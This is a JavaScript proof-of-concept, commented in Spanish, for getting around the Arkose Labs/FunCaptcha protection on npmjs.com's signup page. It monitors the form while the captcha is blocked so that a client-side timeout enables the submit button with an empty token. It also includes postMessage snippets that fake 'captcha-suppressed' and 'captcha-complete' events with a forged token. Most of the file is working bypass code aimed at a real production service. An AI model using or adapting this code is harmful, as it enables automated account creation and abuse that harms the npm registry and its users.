// ================================================================
// PoC v2: Bypass de Captcha en npmjs.com/signup
//
// AHORA SABEMOS:
// - El captcha es Arkose Labs/FunCaptcha via octocaptcha.com
// - Public Key: D72ECCFB-262E-4065-9196-856E70BE98ED
// - El código tiene timeout de 20s que llama showSuccess()
// - Hay un bug cross-origin en captcha.js:91
//
// MÉTODO: Bloquear la carga del captcha y esperar el timeout
// ================================================================

// PASO 1: Verificar estado inicial
console.log("=== PoC Captcha Bypass v2 ===");
console.log("[*] Timestamp inicio:", new Date().toLocaleTimeString());

function checkState() {
    const frame = document.querySelector('iframe[title*="captcha"]');
    const token = document.querySelector('input[name="octocaptchaToken"]');
    const error = document.querySelector('input[name="errorLoadingCaptcha"]');
    const submit = document.querySelector('button[type="submit"]');

    const state = {
        time: new Date().toLocaleTimeString(),
        hasFrame: !!frame,
        frameSrc: frame ? frame.src : 'N/A',
        frameVisible: frame ? (frame.style.display !== 'none' && frame.offsetHeight > 0) : false,
        tokenValue: token ? (token.value || '(vacío)') : 'N/A',
        tokenLength: token ? token.value.length : 0,
        errorLoading: error ? error.value : 'N/A',
        submitEnabled: submit ? !submit.disabled : false,
        submitText: submit ? submit.textContent.trim() : 'N/A'
    };

    console.log(`[${state.time}] Frame: ${state.hasFrame ? 'SÍ' : 'NO'} | Visible: ${state.frameVisible} | Token: ${state.tokenLength > 0 ? state.tokenLength + ' chars' : 'VACÍO'} | Error: ${state.errorLoading} | Submit: ${state.submitEnabled ? '✅ HABILITADO' : '❌ deshabilitado'}`);

    return state;
}

// PASO 2: Monitorear cada 5 segundos por 35 segundos
console.log("[*] Monitoreando estado del captcha cada 5s...");
console.log("[*] Si el captcha no carga, en ~20s debería habilitarse el submit");
console.log("");

let checks = 0;
const maxChecks = 7; // 35 segundos

const monitor = setInterval(() => {
    checks++;
    const state = checkState();

    if (state.submitEnabled && state.tokenLength === 0) {
        console.log("");
        console.log("[!!!] ¡BYPASS CONFIRMADO!");
        console.log("[!!!] Submit HABILITADO con token VACÍO");
        console.log("[!!!] errorLoadingCaptcha:", state.errorLoading);
        clearInterval(monitor);
    }

    if (state.submitEnabled && state.tokenLength > 0) {
        console.log("");
        console.log("[*] Captcha resuelto normalmente (token presente)");
        clearInterval(monitor);
    }

    if (checks >= maxChecks) {
        console.log("");
        console.log("[*] Monitoreo finalizado tras 35s");
        const finalState = checkState();
        if (!finalState.submitEnabled) {
            console.log("[*] Submit sigue deshabilitado - el bypass por timeout NO funcionó");
            console.log("[*] Puede que Arkose Labs haya cargado correctamente");
        }
        clearInterval(monitor);
    }
}, 5000);

// Estado inicial
checkState();


// ================================================================
// PRUEBA ADICIONAL: Verificar si postMessage bypass funciona
// ================================================================

console.log("\n[*] Para probar bypass via postMessage, ejecutar:");
console.log(`
// Simular eventos que el captcha envía al componente React
// Evento 1: captcha-suppressed (debería llamar showSuccess sin token)
window.postMessage({event: 'captcha-suppressed'}, 'https://www.npmjs.com');

// Verificar después de 2 segundos
setTimeout(() => {
    const token = document.querySelector('input[name="octocaptchaToken"]');
    const error = document.querySelector('input[name="errorLoadingCaptcha"]');
    const submit = document.querySelector('button[type="submit"]');
    console.log("--- Post-postMessage ---");
    console.log("Token:", token?.value || "(vacío)");
    console.log("Error:", error?.value);
    console.log("Submit:", submit?.disabled ? "DESHABILITADO" : "HABILITADO");
}, 2000);
`);


// ================================================================
// PRUEBA ADICIONAL: Ver si se puede falsificar captcha-complete
// ================================================================

console.log("\n[*] Para probar token falso via postMessage:");
console.log(`
// Simular captcha-complete con token falso
// El código en captcha.js verifica: e.origin !== this.octocaptchaURL
// octocaptchaURL = "https://octocaptcha.com"
// PERO postMessage desde la misma página tiene origin "https://www.npmjs.com"
// así que DEBERÍA ser rechazado por la validación de origen

// Intentar de todas formas:
window.postMessage({
    event: 'captcha-complete',
    sessionToken: 'fake-token-12345'
}, 'https://www.npmjs.com');

setTimeout(() => {
    const token = document.querySelector('input[name="octocaptchaToken"]');
    const submit = document.querySelector('button[type="submit"]');
    console.log("Token después de fake:", token?.value || "(vacío)");
    console.log("Submit:", submit?.disabled ? "DESHABILITADO" : "HABILITADO");

    if (token?.value === 'fake-token-12345') {
        console.log("[!!!] CRÍTICO: Token falso ACEPTADO - validación de origen FALLIDA");
    } else {
        console.log("[*] Token falso rechazado - validación de origen funciona correctamente");
    }
}, 2000);
`);


// ================================================================
// INFO: Datos descubiertos del captcha
// ================================================================

console.log("\n=== Datos del sistema captcha ===");
console.log("Proveedor: Arkose Labs (FunCaptcha)");
console.log("Wrapper: octocaptcha.com (propiedad de GitHub)");
console.log("Public Key: D72ECCFB-262E-4065-9196-856E70BE98ED");
console.log("API endpoints: api.funcaptcha.com, github-api.arkoselabs.com");
console.log("Región: us-east-1");
console.log("Timeout del cliente: 20 segundos");
console.log("Bug conocido: captcha.js:91 - cross-origin access error");
